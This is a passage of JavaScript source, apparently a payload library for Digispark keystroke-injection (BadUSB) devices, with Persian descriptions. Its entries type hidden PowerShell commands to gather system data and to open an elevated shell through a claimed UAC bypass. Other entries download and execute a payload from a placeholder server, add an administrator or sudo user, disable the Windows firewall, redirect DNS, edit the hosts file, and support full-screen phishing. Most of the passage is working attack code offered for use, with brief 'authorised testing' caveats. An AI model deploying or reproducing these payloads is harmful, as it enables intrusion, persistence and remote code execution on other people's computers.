        actions: (os) => {
            return [
                { type: 'comment', value: 'Toggle NumLock and CapsLock' },
                { type: 'press_key', value: 'KEY_NUMLOCK', delay: 200 },
                { type: 'press_key', value: 'KEY_CAPSLOCK', delay: 200 },
                { type: 'press_key', value: 'KEY_NUMLOCK', delay: 200 },
                { type: 'press_key', value: 'KEY_CAPSLOCK', delay: 200 },
                { type: 'press_key', value: 'KEY_NUMLOCK', delay: 200 },
                { type: 'press_key', value: 'KEY_CAPSLOCK', delay: 200 },
                { type: 'comment', value: 'Add more toggles or put in loop() for continuous effect.' }
            ];
        }
    },

    // --- Information Gathering (جمع‌آوری اطلاعات) ---
    digi_system_info_grab_windows: {
        description: "این پی‌لود اطلاعات کلیدی سیستم ویندوز (اطلاعات سخت‌افزار، نرم‌افزار، وصله‌های امنیتی) رو جمع‌آوری می‌کنه. خروجی رو می‌تونید به یک فایل در دسکتاپ هدایت کنید.",
        type: 'digispark',
        actions: (os) => {
            const guiKey = osDigisparkKeyMap[os].gui;
            const enterKey = osDigisparkKeyMap[os].enter;
            if (os === 'windows') {
                return [
                    { type: 'comment', value: 'Open PowerShell (Hidden)' },
                    { type: 'combined_keys', value: { modifiers: [guiKey], key: 'KEY_R' }, delay: 500 },
                    { type: 'keyboard', value: 'powershell -NoP -NonI -WindowStyle Hidden', delay: 100 },
                    { type: 'press_key', value: enterKey, delay: 1000 },
                    { type: 'comment', value: 'Gather System Info' },
                    { type: 'keyboard', value: 'Get-WmiObject -Class Win32_ComputerSystem | Select-Object Name,Domain,Manufacturer,Model,NumberOfProcessors,TotalPhysicalMemory -OutFile "$env:USERPROFILE\\Desktop\\SystemInfo.txt";', delay: 100 },
                    { type: 'press_key', value: enterKey, delay: 500 },
                    { type: 'keyboard', value: 'Get-WmiObject -Class Win32_OperatingSystem | Select-Object Caption,CSDVersion,OSArchitecture,Version,BuildNumber -Append -OutFile "$env:USERPROFILE\\Desktop\\SystemInfo.txt";', delay: 100 },
                    { type: 'press_key', value: enterKey, delay: 500 },
                    { type: 'comment', value: 'Installed Software' },
                    { type: 'keyboard', value: 'Get-WmiObject -Class Win32_Product | Select-Object Name,Version | Format-Table -AutoSize -Wrap | Out-String | Add-Content -Path "$env:USERPROFILE\\Desktop\\SystemInfo.txt";', delay: 100 },
                    { type: 'press_key', value: enterKey, delay: 1000 },
                    { type: 'comment', value: 'Close PowerShell' },
                    { type: 'keyboard', value: 'exit', delay: 100 },
                    { type: 'press_key', value: enterKey, delay: 100 }
                ];
            }
            return [{ type: 'comment', value: 'This blueprint is for Windows only.' }];
        }
    },
    digi_system_info_grab_linux: {
        description: "این پی‌لود اطلاعات سیستم لینوکس (Kernel، توزیع، RAM، CPU) رو جمع‌آوری می‌کنه و اون‌ها رو در یک فایل روی دسکتاپ ذخیره می‌کنه.",
        type: 'digispark',
        actions: (os) => {
            const guiKey = osDigisparkKeyMap[os].gui;
            const enterKey = osDigisparkKeyMap[os].enter;
            if (os === 'linux') {
                return [
                    { type: 'comment', value: 'Open Terminal' },
                    { type: 'combined_keys', value: { modifiers: [osDigisparkKeyMap[os].ctrl, osDigisparkKeyMap[os].alt], key: 'KEY_T' }, delay: 500 },
                    { type: 'delay', value: 1000 },
                    { type: 'comment', value: 'Gather System Info' },
                    { type: 'keyboard', value: 'uname -a > ~/Desktop/SystemInfo.txt && echo "" >> ~/Desktop/SystemInfo.txt', delay: 100 },
                    { type: 'press_key', value: enterKey, delay: 500 },
                    { type: 'keyboard', value: 'cat /etc/os-release >> ~/Desktop/SystemInfo.txt && echo "" >> ~/Desktop/SystemInfo.txt', delay: 100 },
                    { type: 'press_key', value: enterKey, delay: 500 },
                    { type: 'keyboard', value: 'lscpu >> ~/Desktop/SystemInfo.txt && echo "" >> ~/Desktop/SystemInfo.txt', delay: 100 },
                    { type: 'press_key', value: enterKey, delay: 500 },
                    { type: 'keyboard', value: 'free -h >> ~/Desktop/SystemInfo.txt && echo "" >> ~/Desktop/SystemInfo.txt', delay: 100 },
                    { type: 'press_key', value: enterKey, delay: 500 },
                    { type: 'comment', value: 'Close Terminal' },
                    { type: 'keyboard', value: 'exit', delay: 100 },
                    { type: 'press_key', value: enterKey, delay: 100 }
                ];
            }
            return [{ type: 'comment', value: 'This blueprint is for Linux only.' }];
        }
    },
    digi_list_files_directories_windows: {
        description: "این پی‌لود محتوای یک دایرکتوری مشخص (مثلاً `C:\\Users\\<YourUsername>\\Documents`) رو لیست می‌کنه و اون رو در یک فایل روی دسکتاپ ذخیره می‌کنه.",
        type: 'digispark',
        actions: (os) => {
            const guiKey = osDigisparkKeyMap[os].gui;
            const enterKey = osDigisparkKeyMap[os].enter;
            if (os === 'windows') {
                return [
                    { type: 'comment', value: 'Open PowerShell (Hidden)' },
                    { type: 'combined_keys', value: { modifiers: [guiKey], key: 'KEY_R' }, delay: 500 },
                    { type: 'keyboard', value: 'powershell -NoP -NonI -WindowStyle Hidden', delay: 100 },
                    { type: 'press_key', value: enterKey, delay: 1000 },
                    { type: 'comment', value: 'List Documents folder content' },
                    { type: 'keyboard', value: 'Get-ChildItem -Path "$env:USERPROFILE\\Documents" -Recurse | Select-Object FullName,Length,CreationTime | Out-File "$env:USERPROFILE\\Desktop\\DocumentsList.txt"', delay: 100 },
                    { type: 'press_key', value: enterKey, delay: 1000 },
                    { type: 'comment', value: 'Close PowerShell' },
                    { type: 'keyboard', value: 'exit', delay: 100 },
                    { type: 'press_key', value: enterKey, delay: 100 }
                ];
            }
            return [{ type: 'comment', value: 'This blueprint is for Windows only.' }];
        }
    },
    digi_installed_programs_windows: {
        description: "این پی‌لود لیستی از برنامه‌های نصب شده روی سیستم ویندوز رو جمع‌آوری می‌کنه و در یک فایل متنی روی دسکتاپ ذخیره می‌کنه.",
        type: 'digispark',
        actions: (os) => {
            const guiKey = osDigisparkKeyMap[os].gui;
            const enterKey = osDigisparkKeyMap[os].enter;
            if (os === 'windows') {
                return [
                    { type: 'comment', value: 'Open PowerShell (Hidden)' },
                    { type: 'combined_keys', value: { modifiers: [guiKey], key: 'KEY_R' }, delay: 500 },
                    { type: 'keyboard', value: 'powershell -NoP -NonI -WindowStyle Hidden', delay: 100 },
                    { type: 'press_key', value: enterKey, delay: 1000 },
                    { type: 'comment', value: 'List Installed Programs' },
                    { type: 'keyboard', value: 'Get-ItemProperty HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -AutoSize | Out-String | Set-Content -Path "$env:USERPROFILE\\Desktop\\InstalledPrograms.txt"', delay: 100 },
                    { type: 'press_key', value: enterKey, delay: 1500 },
                    { type: 'comment', value: 'Close PowerShell' },
                    { type: 'keyboard', value: 'exit', delay: 100 },
                    { type: 'press_key', value: enterKey, delay: 100 }
                ];
            }
            return [{ type: 'comment', value: 'This blueprint is for Windows only.' }];
        }
    },
    digi_network_config_grab_windows: {
        description: "این پی‌لود پیکربندی شبکه (آی‌پی، DNS، گیت‌وی) رو از یک سیستم ویندوز استخراج می‌کنه و اون رو در یک فایل روی دسکتاپ ذخیره می‌کنه.",
        type: 'digispark',
        actions: (os) => {
            const guiKey = osDigisparkKeyMap[os].gui;
            const enterKey = osDigisparkKeyMap[os].enter;
            if (os === 'windows') {
                return [
                    { type: 'comment', value: 'Open Command Prompt (Hidden)' },
                    { type: 'combined_keys', value: { modifiers: [guiKey], key: 'KEY_R' }, delay: 500 },
                    { type: 'keyboard', value: 'cmd /c start /min cmd', delay: 100 },
                    { type: 'press_key', value: enterKey, delay: 1000 },
                    { type: 'comment', value: 'Get IP Config and Save to File' },
                    { type: 'keyboard', value: 'ipconfig /all > "%USERPROFILE%\\Desktop\\NetworkConfig.txt"', delay: 100 },
                    { type: 'press_key', value: enterKey, delay: 1000 },
                    { type: 'comment', value: 'Close Command Prompt' },
                    { type: 'keyboard', value: 'exit', delay: 100 },
                    { type: 'press_key', value: enterKey, delay: 100 }
                ];
            }
            return [{ type: 'comment', value: 'This blueprint is for Windows only.' }];
        }
    },
    digi_mac_system_info_grab_mac: {
        description: "این پی‌لود اطلاعات کلیدی سیستم macOS (نسخه، مدل، پردازنده، حافظه) رو جمع‌آوری می‌کنه و در یک فایل روی دسکتاپ ذخیره می‌کنه.",
        type: 'digispark',
        actions: (os) => {
            const cmdKey = osDigisparkKeyMap[os].gui;
            const enterKey = osDigisparkKeyMap[os].enter;
            if (os === 'mac') {
                return [
                    { type: 'comment', value: 'Open Terminal via Spotlight' },
                    { type: 'combined_keys', value: { modifiers: [cmdKey], key: 'KEY_SPACE' }, delay: 500 },
                    { type: 'keyboard', value: 'terminal', delay: 100 },
                    { type: 'press_key', value: enterKey, delay: 1000 },
                    { type: 'comment', value: 'Gather System Information' },
                    { type: 'keyboard', value: 'sysctl hw.model hw.memsize hw.physicalcpu hw.logicalcpu machdep.cpu.brand_string > ~/Desktop/MacSystemInfo.txt', delay: 100 },
                    { type: 'press_key', value: enterKey, delay: 500 },
                    { type: 'keyboard', value: 'sw_vers >> ~/Desktop/MacSystemInfo.txt', delay: 100 },
                    { type: 'press_key', value: enterKey, delay: 500 },
                    { type: 'comment', value: 'Close Terminal' },
                    { type: 'keyboard', value: 'exit', delay: 100 },
                    { type: 'press_key', value: enterKey, delay: 100 }
                ];
            }
            return [{ type: 'comment', value: 'This blueprint is for macOS only.' }];
        }
    },


    // --- Privilege Escalation (افزایش سطح دسترسی) ---
    digi_bypass_uac_download_exec_windows: {
        description: "این پی‌لود UAC در ویندوز رو دور می‌زنه، PowerShell رو به عنوان ادمین باز می‌کنه، و یک فایل رو از URL مشخص دانلود و اجرا می‌کنه. **با احتیاط شدید و فقط روی سیستم‌هایی که مالک اون‌ها هستید و اجازه‌ی تست دارید، استفاده کنید.**",
        type: 'digispark',
        actions: (os) => {
            const guiKey = osDigisparkKeyMap[os].gui;
            const enterKey = osDigisparkKeyMap[os].enter;
            if (os === 'windows') {
                return [
                    { type: 'comment', value: 'Bypass UAC and Open PowerShell as Admin' },
                    { type: 'combined_keys', value: { modifiers: [guiKey], key: 'KEY_R' }, delay: 500 },
                    { type: 'keyboard', value: 'powershell -NoP -NonI -Exec Bypass -W Hidden "$ws = New-Object -ComObject Wscript.Shell; $ws.Run(\'cmd.exe /c start powershell -windowstyle hidden -command &{Start-Process powershell -Verb RunAs}\', 0, $True);"' , delay: 500},
                    { type: 'press_key', value: enterKey, delay: 2000 },
                    { type: 'press_key', value: 'KEY_LEFT_ARROW', delay: 200 },
                    { type: 'press_key', value: enterKey, delay: 2000 },
                    { type: 'comment', value: 'Download & Execute File (CHANGE URL!)' },
                    { type: 'keyboard', value: '$url="http://YOUR_SERVER/payload.exe"; $output="$env:TEMP\\payload.exe"; Invoke-WebRequest -Uri $url -OutFile $output; Start-Process $output', delay: 100 },
                    { type: 'press_key', value: enterKey, delay: 500 }
                ];
            }
            return [{ type: 'comment', value: 'This blueprint is for Windows only.' }];
        }
    },
    // No direct, reliable, universal Digispark privilege escalation for Linux/macOS without more complex attack chains
    // or specific vulnerabilities. These are typically handled by actual exploits, not simple keyboard injection.

    // --- User Account Manipulation (دستکاری حساب کاربری) ---
    digi_add_user_windows: {
        description: "این پی‌لود یک کاربر جدید با سطح ادمین روی ویندوز اضافه می‌کنه. **نام کاربری و پسورد رو تغییر بدید.** این برای تست‌های مجاز دسترسی مجدد هست.",
        type: 'digispark',
        actions: (os) => {
            const guiKey = osDigisparkKeyMap[os].gui;
            const enterKey = osDigisparkKeyMap[os].enter;
            if (os === 'windows') {
                return [
                    { type: 'comment', value: 'Open Command Prompt as Admin' },
                    { type: 'combined_keys', value: { modifiers: [guiKey], key: 'KEY_R' }, delay: 500 },
                    { type: 'keyboard', value: 'cmd', delay: 100 },
                    { type: 'press_key', value: enterKey, delay: 500 },
                    { type: 'keyboard', value: 'powershell -NoP -NonI -Exec Bypass -W Hidden "$ws = New-Object -ComObject Wscript.Shell; $ws.Run(\'cmd.exe /c start cmd /k powershell -windowstyle hidden -command &{Start-Process cmd -Verb RunAs}\', 0, $True);"', delay: 500 },
                    { type: 'press_key', value: enterKey, delay: 2000 },
                    { type: 'press_key', value: 'KEY_LEFT_ARROW', delay: 200 },
                    { type: 'press_key', value: enterKey, delay: 2000 },
                    { type: 'comment', value: 'Add New User and Add to Administrators Group' },
                    { type: 'keyboard', value: 'net user NewUser SecurePass123! /add', delay: 100 }, // CHANGE USERNAME AND PASSWORD!
                    { type: 'press_key', value: enterKey, delay: 500 },
                    { type: 'keyboard', value: 'net localgroup Administrators NewUser /add', delay: 100 },
                    { type: 'press_key', value: enterKey, delay: 500 },
                    { type: 'keyboard', value: 'exit', delay: 100 },
                    { type: 'press_key', value: enterKey, delay: 100 }
                ];
            }
            return [{ type: 'comment', value: 'This blueprint is for Windows only.' }];
        }
    },
    digi_disable_user_windows: {
        description: "این پی‌لود یک کاربر موجود رو در ویندوز غیرفعال می‌کنه. **USERNAME_TO_DISABLE رو جایگزین کنید.**",
        type: 'digispark',
        actions: (os) => {
            const guiKey = osDigisparkKeyMap[os].gui;
            const enterKey = osDigisparkKeyMap[os].enter;
            if (os === 'windows') {
                return [
                    { type: 'comment', value: 'Open Command Prompt as Admin' },
                    { type: 'combined_keys', value: { modifiers: [guiKey], key: 'KEY_R' }, delay: 500 },
                    { type: 'keyboard', value: 'cmd', delay: 100 },
                    { type: 'press_key', value: enterKey, delay: 500 },
                    { type: 'keyboard', value: 'powershell -NoP -NonI -Exec Bypass -W Hidden "$ws = New-Object -ComObject Wscript.Shell; $ws.Run(\'cmd.exe /c start cmd /k powershell -windowstyle hidden -command &{Start-Process cmd -Verb RunAs}\', 0, $True);"', delay: 500 },
                    { type: 'press_key', value: enterKey, delay: 2000 },
                    { type: 'press_key', value: 'KEY_LEFT_ARROW', delay: 200 },
                    { type: 'press_key', value: enterKey, delay: 2000 },
                    { type: 'comment', value: 'Disable User Account' },
                    { type: 'keyboard', value: 'net user USERNAME_TO_DISABLE /active:no', delay: 100 }, // CHANGE USERNAME!
                    { type: 'press_key', value: enterKey, delay: 500 },
                    { type: 'keyboard', value: 'exit', delay: 100 },
                    { type: 'press_key', value: enterKey, delay: 100 }
                ];
            }
            return [{ type: 'comment', value: 'This blueprint is for Windows only.' }];
        }
    },
    digi_linux_add_sudo_user: {
        description: "این پی‌لود یک کاربر جدید با دسترسی `sudo` در لینوکس اضافه می‌کنه. **USERNAME و PASSWORD رو تغییر بدید.**",
        type: 'digispark',
        actions: (os) => {
            const guiKey = osDigisparkKeyMap[os].gui; // Or relevant Linux key
            const enterKey = osDigisparkKeyMap[os].enter;
            if (os === 'linux') {
                return [
                    { type: 'comment', value: 'Open Terminal' },
                    { type: 'combined_keys', value: { modifiers: [osDigisparkKeyMap[os].ctrl, osDigisparkKeyMap[os].alt], key: 'KEY_T' }, delay: 500 },
                    { type: 'delay', value: 1000 },
                    { type: 'comment', value: 'Add New User and Add to Sudo Group (Enter your password if prompted)' },
                    { type: 'keyboard', value: 'sudo useradd -m -s /bin/bash NEWUSER', delay: 100 }, // CHANGE NEWUSER
                    { type: 'press_key', value: enterKey, delay: 500 },
                    // { type: 'keyboard', value: 'YOUR_SUDO_PASSWORD', delay: 500 }, // Uncomment and set if needed
                    // { type: 'press_key', value: enterKey, delay: 500 },
                    { type: 'keyboard', value: 'sudo passwd NEWUSER', delay: 100 },
                    { type: 'press_key', value: enterKey, delay: 500 },
                    { type: 'keyboard', value: 'NEWPASS', delay: 100 }, // CHANGE NEWPASS
                    { type: 'press_key', value: enterKey, delay: 500 },
                    { type: 'keyboard', value: 'NEWPASS', delay: 100 }, // Confirm NEWPASS
                    { type: 'press_key', value: enterKey, delay: 500 },
                    { type: 'keyboard', value: 'sudo usermod -aG sudo NEWUSER', delay: 100 }, // Add to sudo group
                    { type: 'press_key', value: enterKey, delay: 500 },
                    { type: 'comment', value: 'Close Terminal' },
                    { type: 'keyboard', value: 'exit', delay: 100 },
                    { type: 'press_key', value: enterKey, delay: 100 }
                ];
            }
            return [{ type: 'comment', value: 'This blueprint is for Linux only.' }];
        }
    },

    // --- Network Manipulation (دستکاری شبکه) ---
    digi_change_dns_windows: {
        description: "این پی‌لود سرور DNS سیستم ویندوز رو تغییر می‌ده. **YOUR_DNS_SERVER_IP رو با DNS دلخواه خودتون جایگزین کنید.**",
        type: 'digispark',
        actions: (os) => {
            const guiKey = osDigisparkKeyMap[os].gui;
            const enterKey = osDigisparkKeyMap[os].enter;
            if (os === 'windows') {
                return [
                    { type: 'comment', value: 'Open PowerShell as Admin' },
                    { type: 'combined_keys', value: { modifiers: [guiKey], key: 'KEY_R' }, delay: 500 },
                    { type: 'keyboard', value: 'powershell -NoP -NonI -Exec Bypass -W Hidden "$ws = New-Object -ComObject Wscript.Shell; $ws.Run(\'cmd.exe /c start powershell -windowstyle hidden -command &{Start-Process powershell -Verb RunAs}\', 0, $True);"', delay: 500 },
                    { type: 'press_key', value: enterKey, delay: 2000 },
                    { type: 'press_key', value: 'KEY_LEFT_ARROW', delay: 200 },
                    { type: 'press_key', value: enterKey, delay: 2000 },
                    { type: 'comment', value: 'Change DNS Server (Replace YOUR_DNS_SERVER_IP)' },
                    { type: 'keyboard', value: '$nic = Get-NetAdapter | Where-Object {$_.Status -eq "Up" -and $_.LinkSpeed -ne "0 Bps"}; if ($nic) { Set-DnsClientServerAddress -InterfaceAlias $nic.Name -ServerAddresses ("YOUR_DNS_SERVER_IP") };', delay: 100 },
                    { type: 'press_key', value: enterKey, delay: 1000 },
                    { type: 'comment', value: 'Close PowerShell' },
                    { type: 'keyboard', value: 'exit', delay: 100 },
                    { type: 'press_key', value: enterKey, delay: 100 }
                ];
            }
            return [{ type: 'comment', value: 'This blueprint is for Windows only.' }];
        }
    },
    digi_block_website_windows: {
        description: "این پی‌لود یک وب‌سایت خاص رو با اضافه کردن یک ورودی به فایل hosts ویندوز مسدود می‌کنه. **DOMAIN_TO_BLOCK رو جایگزین کنید.**",
        type: 'digispark',
        actions: (os) => {
            const guiKey = osDigisparkKeyMap[os].gui;
            const enterKey = osDigisparkKeyMap[os].enter;
            if (os === 'windows') {
                return [
                    { type: 'comment', value: 'Open Notepad as Admin to edit hosts file' },
                    { type: 'combined_keys', value: { modifiers: [guiKey], key: 'KEY_R' }, delay: 500 },
                    { type: 'keyboard', value: 'notepad', delay: 100 },
                    { type: 'press_key', value: enterKey, delay: 500 },
                    { type: 'keyboard', value: 'File -> Open', delay: 500 },
                    { type: 'combined_keys', value: { modifiers: [osDigisparkKeyMap[os].alt], key: 'KEY_F' }, delay: 200 },
                    { type: 'keyboard', value: 'o', delay: 200 },
                    { type: 'delay', value: 1000 },
                    { type: 'keyboard', value: '%SystemRoot%\\System32\\drivers\\etc\\hosts', delay: 100 },
                    { type: 'press_key', value: enterKey, delay: 1000 },
                    { type: 'comment', value: 'Add malicious entry to hosts file (Replace DOMAIN_TO_BLOCK)' },
                    { type: 'keyboard', value: '127.0.0.1 DOMAIN_TO_BLOCK', delay: 50 },
                    { type: 'press_key', value: enterKey, delay: 100 },
                    { type: 'comment', value: 'Save and Close' },
                    { type: 'combined_keys', value: { modifiers: [osDigisparkKeyMap[os].ctrl], key: 'KEY_S' }, delay: 500 },
                    { type: 'press_key', value: 'KEY_LEFT_ARROW', delay: 200 }, // No to save changes to other files
                    { type: 'press_key', value: enterKey, delay: 200 },
                    { type: 'combined_keys', value: { modifiers: [osDigisparkKeyMap[os].alt], key: 'KEY_F4' }, delay: 500 }
                ];
            }
            return [{ type: 'comment', value: 'This blueprint is for Windows only.' }];
        }
    },
    digi_disable_firewall_windows: {
        description: "این پی‌لود فایروال ویندوز رو غیرفعال می‌کنه. **با احتیاط استفاده کنید!**",
        type: 'digispark',
        actions: (os) => {
            const guiKey = osDigisparkKeyMap[os].gui;
            const enterKey = osDigisparkKeyMap[os].enter;
            if (os === 'windows') {
                return [
                    { type: 'comment', value: 'Open Command Prompt as Admin' },
                    { type: 'combined_keys', value: { modifiers: [guiKey], key: 'KEY_R' }, delay: 500 },
                    { type: 'keyboard', value: 'cmd', delay: 100 },
                    { type: 'press_key', value: enterKey, delay: 500 },
                    { type: 'keyboard', value: 'powershell -NoP -NonI -Exec Bypass -W Hidden "$ws = New-Object -ComObject Wscript.Shell; $ws.Run(\'cmd.exe /c start cmd /k powershell -windowstyle hidden -command &{Start-Process cmd -Verb RunAs}\', 0, $True);"', delay: 500 },
                    { type: 'press_key', value: enterKey, delay: 2000 },
                    { type: 'press_key', value: 'KEY_LEFT_ARROW', delay: 200 },
                    { type: 'press_key', value: enterKey, delay: 2000 },
                    { type: 'comment', value: 'Disable Windows Firewall' },
                    { type: 'keyboard', value: 'netsh advfirewall set allprofiles state off', delay: 100 },
                    { type: 'press_key', value: enterKey, delay: 500 },
                    { type: 'keyboard', value: 'exit', delay: 100 },
                    { type: 'press_key', value: enterKey, delay: 100 }
                ];
            }
            return [{ type: 'comment', value: 'This blueprint is for Windows only.' }];
        }
    },

    // --- Browser & Application Attacks (حملات مرورگر و برنامه‌ها) ---
    digi_open_website: {
        description: "این پی‌لود یک مرورگر وب (پیش‌فرض) رو باز می‌کنه و به یک آدرس URL مشخص می‌ره. **URL_TO_OPEN رو جایگزین کنید.**",
        type: 'digispark',
        actions: (os) => {
            const guiKey = osDigisparkKeyMap[os].gui;
            const enterKey = osDigisparkKeyMap[os].enter;
            let actions = [];

            if (os === 'windows') {
                actions.push(
                    { type: 'comment', value: 'Open Run Dialog' },
                    { type: 'combined_keys', value: { modifiers: [guiKey], key: 'KEY_R' }, delay: 500 },
                    { type: 'keyboard', value: 'start URL_TO_OPEN', delay: 100 }, // Example: start https://malicious.com
                    { type: 'press_key', value: enterKey, delay: 500 }
                );
            } else if (os === 'mac') {
                actions.push(
                    { type: 'comment', value: 'Open Spotlight' },
                    { type: 'combined_keys', value: { modifiers: [guiKey], key: 'KEY_SPACE' }, delay: 500 },
                    { type: 'keyboard', value: 'safari', delay: 100 }, // Or chrome/firefox
                    { type: 'press_key', value: enterKey, delay: 1000 },
                    { type: 'keyboard', value: 'URL_TO_OPEN', delay: 100 },
                    { type: 'press_key', value: enterKey, delay: 500 }
                );
            } else if (os === 'linux') {
                actions.push(
                    { type: 'comment', value: 'Open Terminal' },
                    { type: 'combined_keys', value: { modifiers: [osDigisparkKeyMap[os].ctrl, osDigisparkKeyMap[os].alt], key: 'KEY_T' }, delay: 500 },
                    { type: 'delay', value: 1000 },
                    { type: 'comment', value: 'Open default browser' },
                    { type: 'keyboard', value: 'xdg-open URL_TO_OPEN', delay: 100 }, // Or firefox/google-chrome
                    { type: 'press_key', value: enterKey, delay: 500 },
                    { type: 'keyboard', value: 'exit', delay: 100 },
                    { type: 'press_key', value: enterKey, delay: 100 }
                );
            }
            return actions;
        }
    },
    digi_force_browser_full_screen: {
        description: "این پی‌لود مرورگر فعال رو مجبور می‌کنه به حالت تمام‌صفحه بره. برای حملات فیشینگ تمام‌صفحه (Full-Screen Phishing) مفید است.",
        type: 'digispark',
        actions: (os) => {
            const f11Key = 'KEY_F11';
            const enterKey = osDigisparkKeyMap[os].enter;
            return [
                { type: 'comment', value: 'Put active browser/application into Full Screen Mode' },
                { type: 'press_key', value: f11Key, delay: 100 }
            ];
        }
    },
    digi_open_task_manager_windows: {
        description: "این پی‌لود Task Manager رو در ویندوز باز می‌کنه. می‌تونه برای نشان دادن حضور در سیستم یا دستکاری فرآیندها استفاده بشه.",
        type: 'digispark',
        actions: (os) => {
            const ctrlKey = osDigisparkKeyMap[os].ctrl;
            const shiftKey = osDigisparkKeyMap[os].shift;
            const escKey = osDigisparkKeyMap[os].esc;
            if (os === 'windows') {
                return [
                    { type: 'comment', value: 'Open Task Manager' },
                    { type: 'combined_keys', value: { modifiers: [ctrlKey, shiftKey], key: escKey }, delay: 500 }
                ];
            }
            return [{ type: 'comment', value: 'This blueprint is for Windows only.' }];
        }
    },
    digi_open_dev_tools_browser: {
        description: "این پی‌لود ابزارهای توسعه‌دهنده (Developer Tools) رو در مرورگر فعال (کروم/فایرفاکس) باز می‌کنه. برای تغییر محتوای صفحه یا بررسی اسکریپت‌ها استفاده می‌شه.",
        type: 'digispark',
        actions: (os) => {
            const ctrlKey = osDigisparkKeyMap[os].ctrl;
            const shiftKey = osDigisparkKeyMap[os].shift;
            const iKey = 'KEY_I'; // Common hotkey for Dev Tools

            let actions = [];
            actions.push(
                { type: 'comment', value: 'Open Developer Tools in active browser' },
                { type: 'combined_keys', value: { modifiers: [ctrlKey, shiftKey], key: iKey }, delay: 500 }
            );
            if (os === 'mac') {
                actions.push({ type: 'comment', value: 'For macOS, use CMD+Option+I' });
                actions.push({ type: 'combined_keys', value: { modifiers: [osDigisparkKeyMap[os].gui, osDigisparkKeyMap[os].alt], key: iKey }, delay: 500 });
            }
            return actions;
        }
    },
    // --- Prank Attacks (حملات شوخی) ---
    digi_rick_roll: {
        description: "این پی‌لود یک تب مرورگر جدید باز می‌کنه و کاربر رو به ویدیوی مشهور Rick Astley (Rickroll) هدایت می‌کنه. یک شوخی کلاسیک اینترنتی.",
        type: 'digispark',
        actions: (os) => {
            const guiKey = osDigisparkKeyMap[os].gui;
            const enterKey = osDigisparkKeyMap[os].enter;
            const rickRollUrl = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; // The classic Rickroll URL
            let actions = [];

            if (os === 'windows') {
                actions.push(
                    { type: 'comment', value: 'Open default browser to Rickroll URL' },
                    { type: 'combined_keys', value: { modifiers: [guiKey], key: 'KEY_R' }, delay: 500 },
                    { type: 'keyboard', value: `start ${rickRollUrl}`, delay: 100 },
                    { type: 'press_key', value: enterKey, delay: 500 }
                );
            } else if (os === 'mac') {
                actions.push(
                    { type: 'comment', value: 'Open browser (Safari) to Rickroll URL' },
                    { type: 'combined_keys', value: { modifiers: [guiKey], key: 'KEY_SPACE' }, delay: 500 },
                    { type: 'keyboard', value: 'safari', delay: 100 },
                    { type: 'press_key', value: enterKey, delay: 1000 },
                    { type: 'keyboard', value: rickRollUrl, delay: 100 },
                    { type: 'press_key', value: enterKey, delay: 500 }
                );
            } else if (os === 'linux') {
                actions.push(
                    { type: 'comment', value: 'Open Terminal' },
                    { type: 'combined_keys', value: { modifiers: [osDigisparkKeyMap[os].ctrl, osDigisparkKeyMap[os].alt], key: 'KEY_T' }, delay: 500 },
                    { type: 'delay', value: 1000 },
                    { type: 'comment', value: 'Open default browser to Rickroll URL' },
                    { type: 'keyboard', value: `xdg-open ${rickRollUrl}`, delay: 100 },
                    { type: 'press_key', value: enterKey, delay: 500 },
                    { type: 'keyboard', value: 'exit', delay: 100 },
                    { type: 'press_key', value: enterKey, delay: 100 }
                );
            }
            return actions;
        }
    },
    digi_open_many_notepad_windows: {
        description: "این پی‌لود چندین پنجره Notepad خالی رو در ویندوز باز می‌کنه تا سیستم رو شلوغ کنه. **با احتیاط استفاده کنید تا سیستم فریز نشه!**",
        type: 'digispark',
        actions: (os) => {
            const guiKey = osDigisparkKeyMap[os].gui;
            const enterKey = osDigisparkKeyMap[os].enter;
            if (os === 'windows') {
                return [
                    { type: 'comment', value: 'Open multiple Notepad windows' },
                    { type: 'combined_keys', value: { modifiers: [guiKey], key: 'KEY_R' }, delay: 200 }, { type: 'keyboard', value: 'notepad', delay: 50 }, { type: 'press_key', value: enterKey, delay: 200 },
                    { type: 'combined_keys', value: { modifiers: [guiKey], key: 'KEY_R' }, delay: 200 }, { type: 'keyboard', value: 'notepad', delay: 50 }, { type: 'press_key', value: enterKey, delay: 200 },
                    { type: 'combined_keys', value: { modifiers: [guiKey], key: 'KEY_R' }, delay: 200 }, { type: 'keyboard', value: 'notepad', delay: 50 }, { type: 'press_key', value: enterKey, delay: 200 },
                    { type: 'combined_keys', value: { modifiers: [guiKey], key: 'KEY_R' }, delay: 200 }, { type: 'keyboard', value: 'notepad', delay: 50 }, { type: 'press_key', value: enterKey, delay: 200 },
                    { type: 'combined_keys', value: { modifiers: [guiKey], key: 'KEY_R' }, delay: 200 }, { type: 'keyboard', value: 'notepad', delay: 50 }, { type: 'press_key', value: enterKey, delay: 200 },
                    { type: 'comment', value: 'Adjust number of times or use a loop for more windows' }
                ];
            }
            return [{ type: 'comment', value: 'This blueprint is for Windows only.' }];
        }
    },
    digi_fake_error_message_windows: {
        description: "این پی‌لود یک پیام خطای ساختگی روی صفحه ویندوز نمایش می‌ده. **متن پیام رو تغییر بدید.**",
        type: 'digispark',
        actions: (os) => {
            const guiKey = osDigisparkKeyMap[os].gui;
            const enterKey = osDigisparkKeyMap[os].enter;
            if (os === 'windows') {
                return [
                    { type: 'comment', value: 'Open PowerShell (Hidden)' },
                    { type: 'combined_keys', value: { modifiers: [guiKey], key: 'KEY_R' }, delay: 500 },
                    { type: 'keyboard', value: 'powershell -NoP -NonI -WindowStyle Hidden', delay: 100 },
                    { type: 'press_key', value: enterKey, delay: 1000 },
                    { type: 'comment', value: 'Display Fake Error Message' },
                    { type: 'keyboard', value: '[System.Windows.Forms.MessageBox]::Show("Error: Critical System File Corrupted. Please contact support. Error Code: 0x000000FF", "System Error", 0, 16)', delay: 100 }, // Customize message
                    { type: 'press_key', value: enterKey, delay: 500 },
                    { type: 'comment', value: 'Close PowerShell' },
                    { type: 'keyboard', value: 'exit', delay: 100 },
                    { type: 'press_key', value: enterKey, delay: 100 }
                ];
            }
            return [{ type: 'comment', value: 'This blueprint is for Windows only.' }];
        }
    },
    digi_open_cmd_on_startup_windows: {
        description: "این پی‌لود Command Prompt رو به پوشه Startup ویندوز اضافه می‌کنه تا هر بار که ویندوز بوت می‌شه، CMD باز بشه. **فقط برای شوخی و با آگاهی کامل استفاده کنید.**",
        type: 'digispark',
        actions: (os) => {
